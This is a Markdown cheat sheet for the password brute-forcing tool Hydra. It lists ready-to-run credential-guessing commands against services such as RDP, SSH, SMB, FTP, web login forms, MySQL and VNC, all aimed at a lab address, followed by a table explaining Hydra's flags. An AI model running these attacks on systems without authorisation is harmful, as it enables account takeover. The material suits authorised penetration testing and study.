# Hydra


## Installation

```bash
    apt install hydra
```
## Visit Hydra's Github
#### Go to [hydra github](https://github.com/vanhauser-thc/thc-hydra) page
---
## Documentattion
#### Read [Hydra Manual](../manual/hydra.txt)
---

# Hydra command with example

| Services   | Hydra Commands |
|-----------|--------------|
| RDP       | hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 |
| SSH       | hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V |
| SMB       | hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V |
| FTP       | hydra -l root -P passwords.txt -f ftp://10.0.2.5 -V |
| HTTP Basic Auth | hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V |
| HTTP Post | hydra -L users.txt -P password.txt 10.0.2.5 http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V |
| IMAP      | hydra -l root -P passwords.txt -f imap://10.0.2.5 -V |
| MySQL     | hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V |
| POP3      | hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V |
| Redis     | hydra -P password.txt redis://10.0.2.5 -V |
| Rexec     | hydra -l root -P password.txt rexec://10.0.2.5 -V |
| Rlogin    | hydra -l root -P password.txt rlogin://10.0.2.5 -V |
| RSH       | hydra -L username.txt rsh://10.0.2.5 -V |
| RTSP      | hydra -l root -P passwords.txt <IP> rtsp |
| SMTP      | hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V |
| SMTP (SSL, Port 587) | hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V |
| Telnet    | hydra -l root -P passwords.txt [-t 32] <IP> telnet |
| VNC       | hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt -s <PORT> <IP> vnc |
---
# Parameter and Usage
| Parameter | Explanation |
|-----------|------------|
| `-l`      | Specifies a single username to use in the attack. |
| `-L`      | Specifies a file containing multiple usernames to use. |
| `-p`      | Specifies a single password to use in the attack. |
| `-P`      | Specifies a file containing multiple passwords to try. |
| `-s`      | Specifies a custom port for the service instead of the default one. |
| `-f`      | Stops the attack when the first valid credential is found. |
| `-V`      | Enables verbose mode, showing each attempt made. |
| `-t`      | Specifies the number of parallel threads to speed up attacks (default: 16). |
| `-u`      | Tries the next username only after all passwords for the current one fail. |
| `-o`      | Saves the output results to a file. |
| `-M`      | Specifies a file with multiple target IPs. |
| `-w`      | Sets the wait time between login attempts. |
| `-S`      | Forces SSL mode for encrypted connections. |
| `-v`      | Enables verbose mode (less detailed than `-V`). |
| `-I`      | Ignores failed login attempts (useful when accounts lock after failures). |
| `-R`      | Resumes a previously interrupted attack. |
| `-x`      | Generates a custom password list with defined lengths and characters. |

